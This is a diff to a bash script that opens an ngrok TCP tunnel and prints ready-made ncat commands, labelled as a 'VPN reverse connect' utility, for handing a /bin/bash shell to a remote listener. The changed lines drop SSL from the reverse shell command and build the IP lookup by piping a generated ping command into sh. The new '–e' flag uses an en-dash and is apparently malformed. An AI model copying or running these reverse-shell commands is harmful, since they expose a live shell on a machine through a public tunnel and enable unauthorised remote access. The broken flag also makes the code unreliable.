@@ -33,14 +33,15 @@ echo -e "[${Green}✔${clear}] ${IYellow} Please wait... ${clear}"
 echo -e "[${Green}✔${clear}] ${IYellow} Copy paste utility loading... ${clear}"
 $HOME/ngrok tcp 5576 > /dev/null &
 sleep 7
-ip=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print $1}')
+#ip=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print $1}')
+ip=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print "ping -c1 " $1}'|sh|grep -oP 'PING.*?\(\K[^)]+')
 vport=$(curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url|sed 's#tcp://##g'|sed 's#:# #g'|awk '{print $2}')
 
 echo -e "
 [${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts:${clear}
 [${Green}✔${clear}] ${IYellow}ACCESS TERMINAL${clear}
-\t${IGreen}├──${clear} ${Green}ncat $ip $vport --ssl -e /bin/bash -v ${clear}
-\t${IGreen}└──${clear} ${Green}ncat -l 5576 --ssl -v${clear}
+\t${IGreen}├──${clear} ${Green}ncat $ip $vport –e /bin/bash ${clear}
+\t${IGreen}└──${clear} ${Green}ncat -lkvp 5576 ${clear}
 
 [${Green}✔${clear}] ${IYellow}SHARE TERMINAL${clear}
 \t${IGreen}├──${clear} ${Green}ncat -v -n $ip $vport ${clear}
